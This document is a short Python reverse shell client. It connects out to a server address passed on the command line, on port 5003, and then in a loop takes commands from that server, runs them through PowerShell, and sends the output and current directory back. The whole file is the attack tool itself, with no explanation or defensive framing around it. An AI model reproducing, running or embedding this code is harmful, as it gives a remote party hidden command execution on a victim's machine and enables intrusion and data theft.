import socket
import os
import subprocess
import sys

#server info
SERVER_HOST = sys.argv[1]

SERVER_PORT = 5003

#buffer size
BUFFER_SIZE = 1024 * 128
#separator
SEPARATOR = "<sep>"
#command mode
mode = 'cmd'

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

def run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed

# main loop
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = run(command)

    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    try:
        message = f"{output.stdout.decode()}{SEPARATOR}{cwd}"
    except:
        message = f"{output}{SEPARATOR}{cwd}"

    s.send(message.encode())
# close client connection
s.close()
